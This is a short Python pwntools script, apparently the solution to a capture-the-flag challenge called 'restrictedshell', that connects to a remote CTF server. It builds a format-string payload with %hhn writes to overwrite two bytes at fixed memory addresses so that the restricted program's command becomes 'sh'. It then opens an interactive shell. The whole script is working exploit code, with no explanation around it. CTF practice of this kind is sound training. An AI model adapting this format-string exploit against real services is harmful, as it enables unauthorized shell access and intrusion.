from pwn import *

p = remote('ctf.hackucf.org', 7007)
#p = process('./restrictedshell')

addressOfL = 0x08049c70
addressOfS = 0x08049c71

payload = p32(addressOfS) + p32(addressOfL)
payload += '%{}x%5$hhn'.format(ord('h') - 8)
payload += '%{}x%6$hhn'.format(ord('s') - ord('h'))

p.sendline('prompt')
p.sendline(payload)
p.sendline('ls')
p.interactive()
p.close()